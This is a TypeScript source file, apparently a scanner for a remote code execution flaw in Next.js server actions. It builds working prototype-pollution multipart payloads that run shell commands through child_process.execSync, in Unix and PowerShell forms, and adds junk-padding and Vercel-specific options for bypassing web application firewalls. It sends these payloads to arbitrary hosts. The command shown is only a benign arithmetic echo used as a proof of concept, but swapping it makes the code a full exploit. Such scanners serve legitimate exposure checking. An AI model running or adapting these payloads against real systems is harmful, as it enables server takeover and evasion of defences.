export interface CheckResult {
  host: string;
  vulnerable: boolean | null;
  status_code: number | null;
  error: string | null;
  request: string | null;
  response: string | null;
  final_url: string | null;
  timestamp: string;
}

interface ResponseLike {
  status: number;
  statusText: string;
  headers: Record<string, string>;
  text: string;
}

export function normalizeHost(host: string): string {
  let normalized = host.trim();
  if (!normalized) {
    return "";
  }
  if (!normalized.startsWith("http://") && !normalized.startsWith("https://")) {
    normalized = `https://${normalized}`;
  }
  return normalized.replace(/\/+$/, "");
}

function generateJunkData(sizeBytes: number): [string, string] {
  const letters = "abcdefghijklmnopqrstuvwxyz";
  const chars =
    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";

  let paramName = "";
  for (let i = 0; i < 12; i += 1) {
    paramName += letters[Math.floor(Math.random() * letters.length)];
  }

  let junk = "";
  for (let i = 0; i < sizeBytes; i += 1) {
    junk += chars[Math.floor(Math.random() * chars.length)];
  }

  return [paramName, junk];
}

function buildSafePayload(): [string, string] {
  const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";

  const body =
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="1"\r\n\r\n' +
    "{}\r\n" +
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="0"\r\n\r\n' +
    '["$1:aa:aa"]\r\n' +
    `--${boundary}--`;

  const contentType = `multipart/form-data; boundary=${boundary}`;
  return [body, contentType];
}

function buildVercelWafBypassPayload(): [string, string] {
  const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";

  const part0 =
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,' +
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":' +
    '"var res=process.mainModule.require(\'child_process\').execSync(\'echo $((41*271))\').toString().trim();;' +
    "throw Object.assign(new Error('NEXT_REDIRECT'),{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});\"," +
    '"_chunks":"$Q2","_formData":{"get":"$3:\\"$$:constructor:constructor"}}}';

  const body =
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="0"\r\n\r\n' +
    `${part0}\r\n` +
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="1"\r\n\r\n' +
    '"$@0"\r\n' +
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="2"\r\n\r\n' +
    "[]\r\n" +
    `--${boundary}\r\n` +
    'Content-Disposition: form-data; name="3"\r\n\r\n' +
    '{"\\"\u0024\u0024":{{}}}}\r\n' +
    `--${boundary}--`;

  const contentType = `multipart/form-data; boundary=${boundary}`;
  return [body, contentType];
}

function buildRcePayload(options?: {
  windows?: boolean;
  wafBypass?: boolean;
  wafBypassSizeKb?: number;
}): [string, string] {
  const boundary = "----WebKitFormBoundaryx8jO2oVc6SWP3Sad";
  const windows = options?.windows ?? false;
  const wafBypass = options?.wafBypass ?? false;
  const wafBypassSizeKb = options?.wafBypassSizeKb ?? 128;

  const cmd = windows ? 'powershell -c \\\\"41*271\\\\\"' : "echo $((41*271))";

  const prefixPayload =
    "var res=process.mainModule.require('child_process').execSync('" +
    cmd +
    "')" +
    ".toString().trim();;throw Object.assign(new Error('NEXT_REDIRECT')," +
    "{digest: `NEXT_REDIRECT;push;/login?a=${res};307;`});";

  const part0 =
    '{"then":"$1:__proto__:then","status":"resolved_model","reason":-1,' +
    '"value":"{\\"then\\":\\"$B1337\\"}","_response":{"_prefix":"' +
    prefixPayload +
    '","_chunks":"$Q2","_formData":{"get":"$1:constructor:constructor"}}}';

  const parts: string[] = [];

  if (wafBypass) {
    const [paramName, junk] = generateJunkData(wafBypassSizeKb * 1024);
    parts.push(
      `--${boundary}\r\n` +
        `Content-Disposition: form-data; name="${paramName}"\r\n\r\n` +
        `${junk}\r\n`,
    );
  }

  parts.push(
    `--${boundary}\r\n` +
      'Content-Disposition: form-data; name="0"\r\n\r\n' +
      `${part0}\r\n`,
  );
  parts.push(
    `--${boundary}\r\n` +
      'Content-Disposition: form-data; name="1"\r\n\r\n' +
      '"$@0"\r\n',
  );
  parts.push(
    `--${boundary}\r\n` +
      'Content-Disposition: form-data; name="2"\r\n\r\n' +
      "[]\r\n",
  );
  parts.push(`--${boundary}--`);

  const body = parts.join("");
  const contentType = `multipart/form-data; boundary=${boundary}`;
  return [body, contentType];
}

async function resolveRedirects(
  url: string,
  timeoutSeconds: number,
  maxRedirects = 10,
): Promise<string> {
  let currentUrl = url;
  const originalHost = new URL(url).host;

  for (let i = 0; i < maxRedirects; i += 1) {
    try {
      const response = await timedFetch(currentUrl, {
        method: "HEAD",
        redirect: "manual",
      }, timeoutSeconds);

      const status = response.status;
      if ([301, 302, 303, 307, 308].includes(status)) {
        const locationHeader = getHeader(Object.fromEntries(response.headers.entries()), "location");
        if (locationHeader) {
          if (locationHeader.startsWith("/")) {
            const parsed = new URL(currentUrl);
            currentUrl = `${parsed.protocol}//${parsed.host}${locationHeader}`;
          } else {
            const newHost = new URL(locationHeader).host;
            if (newHost === originalHost) {
              currentUrl = locationHeader;
            } else {
              break;
            }
          }
        } else {
          break;
        }
      } else {
        break;
      }
    } catch {
      break;
    }
  }

  return currentUrl;
}

async function timedFetch(
  input: string,
  init: RequestInit,
  timeoutSeconds: number,
): Promise<Response> {
  const controller = new AbortController();
  const timeout = setTimeout(() => controller.abort(), timeoutSeconds * 1000);

  try {
    const response = await fetch(input, {
      ...init,
      signal: controller.signal,
    });
    return response;
  } finally {
    clearTimeout(timeout);
  }
}

async function sendPayload(
  targetUrl: string,
  headers: Record<string, string>,
  body: string,
  timeoutSeconds: number,
): Promise<[ResponseLike | null, string | null]> {
  try {
    const response = await timedFetch(
      targetUrl,
      {
        method: "POST",
        headers,
        body,
        redirect: "manual",
      },
      timeoutSeconds,
    );

    const text = await response.text();
    const headersObj: Record<string, string> = {};
    response.headers.forEach((value, key) => {
      headersObj[key] = value;
    });

    const wrapped: ResponseLike = {
      status: response.status,
      statusText: response.statusText,
      headers: headersObj,
      text,
    };

    return [wrapped, null];
  } catch (error) {
    if (
      typeof error === "object" &&
      error !== null &&
      "name" in error &&
      (error as { name?: string }).name === "AbortError"
    ) {
      return [null, "Request timed out"];
    }

    return [
      null,
      `Request failed: ${
        error instanceof Error ? error.message : String(error)
      }`,
    ];
  }
}

function getHeader(headers: Record<string, string>, name: string): string {
  const lowerName = name.toLowerCase();
  for (const [key, value] of Object.entries(headers)) {
    if (key.toLowerCase() === lowerName) {
      return value;
    }
  }
  return "";
}

function hasHeader(headers: Record<string, string>, name: string): boolean {
  const lowerName = name.toLowerCase();
  return Object.keys(headers).some(
    (key) => key.toLowerCase() === lowerName,
  );
}

function isVulnerableSafeCheck(response: ResponseLike): boolean {
  if (response.status !== 500 || !response.text.includes('E{"digest"')) {
    return false;
  }

  const serverHeader = getHeader(response.headers, "Server").toLowerCase();
  const hasNetlifyVary = hasHeader(response.headers, "Netlify-Vary");
  const isMitigated =
    hasNetlifyVary ||
    serverHeader === "netlify" ||
    serverHeader === "vercel";

  return !isMitigated;
}

function isVulnerableRceCheck(response: ResponseLike): boolean {
  const redirectHeader = getHeader(response.headers, "X-Action-Redirect");
  return /.*\/login\?a=11111.*/.test(redirectHeader);
}

export async function checkVulnerability(
  host: string,
  options?: {
    timeoutSeconds?: number;
    followRedirects?: boolean;
    safeCheck?: boolean;
    windows?: boolean;
    wafBypass?: boolean;
    wafBypassSizeKb?: number;
    vercelWafBypass?: boolean;
    customHeaders?: Record<string, string>;
  },
): Promise<CheckResult> {
  const timeoutSeconds = options?.timeoutSeconds ?? 10;
  const followRedirects = options?.followRedirects ?? true;
  const safeCheck = options?.safeCheck ?? false;
  const windows = options?.windows ?? false;
  const wafBypass = options?.wafBypass ?? false;
  const wafBypassSizeKb = options?.wafBypassSizeKb ?? 128;
  const vercelWafBypass = options?.vercelWafBypass ?? false;
  const customHeaders = options?.customHeaders ?? undefined;

  const result: CheckResult = {
    host,
    vulnerable: null,
    status_code: null,
    error: null,
    request: null,
    response: null,
    final_url: null,
    timestamp: new Date().toISOString(),
  };

  const normalizedHost = normalizeHost(host);
  if (!normalizedHost) {
    result.error = "Invalid or empty host";
    return result;
  }

  const rootUrl = `${normalizedHost}/`;

  let body: string;
  let contentType: string;
  let isVulnerable: (response: ResponseLike) => boolean;

  if (safeCheck) {
    [body, contentType] = buildSafePayload();
    isVulnerable = isVulnerableSafeCheck;
  } else if (vercelWafBypass) {
    [body, contentType] = buildVercelWafBypassPayload();
    isVulnerable = isVulnerableRceCheck;
  } else {
    [body, contentType] = buildRcePayload({
      windows,
      wafBypass,
      wafBypassSizeKb,
    });
    isVulnerable = isVulnerableRceCheck;
  }

  const headers: Record<string, string> = {
    "User-Agent":
      "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/60.0.3112.113 Safari/537.36 Assetnote/1.0.0",
    "Next-Action": "x",
    "X-Nextjs-Request-Id": "b5dce965",
    "Content-Type": contentType,
    "X-Nextjs-Html-Request-Id": "SSTMXm7OJ_g0Ncx6jpQt9",
  };

  if (customHeaders) {
    Object.assign(headers, customHeaders);
  }

  const buildRequestStr = (url: string): string => {
    const parsed = new URL(url);
    let reqStr = `POST /aaa HTTP/1.1\r\n`;
    reqStr += `Host: ${parsed.host}\r\n`;
    for (const [key, value] of Object.entries(headers)) {
      reqStr += `${key}: ${value}\r\n`;
    }
    reqStr += `Content-Length: ${body.length}\r\n\r\n`;
    reqStr += body;
    return reqStr;
  };

  const buildResponseStr = (resp: ResponseLike): string => {
    let respStr = `HTTP/1.1 ${resp.status} ${resp.statusText}\r\n`;
    for (const [key, value] of Object.entries(resp.headers)) {
      respStr += `${key}: ${value}\r\n`;
    }
    respStr += `\r\n${resp.text.slice(0, 2000)}`;
    return respStr;
  };

  result.final_url = rootUrl;
  result.request = buildRequestStr(rootUrl);

  const [rootResponse, rootError] = await sendPayload(
    rootUrl,
    headers,
    body,
    timeoutSeconds,
  );

  if (rootError || !rootResponse) {
    result.error = rootError ?? "Unknown error";
    return result;
  }

  result.status_code = rootResponse.status;
  result.response = buildResponseStr(rootResponse);

  if (isVulnerable(rootResponse)) {
    result.vulnerable = true;
    return result;
  }

  if (followRedirects) {
    try {
      const redirectUrl = await resolveRedirects(
        rootUrl,
        timeoutSeconds,
      );
      if (redirectUrl !== rootUrl) {
        const [redirectResponse, redirectError] = await sendPayload(
          redirectUrl,
          headers,
          body,
          timeoutSeconds,
        );

        if (redirectError || !redirectResponse) {
          result.vulnerable = false;
          return result;
        }

        result.final_url = redirectUrl;
        result.request = buildRequestStr(redirectUrl);
        result.status_code = redirectResponse.status;
        result.response = buildResponseStr(redirectResponse);

        if (isVulnerable(redirectResponse)) {
          result.vulnerable = true;
          return result;
        }
      }
    } catch {
      // Ignore redirect resolution errors and fall through to root result.
    }
  }

  result.vulnerable = false;
  return result;
}

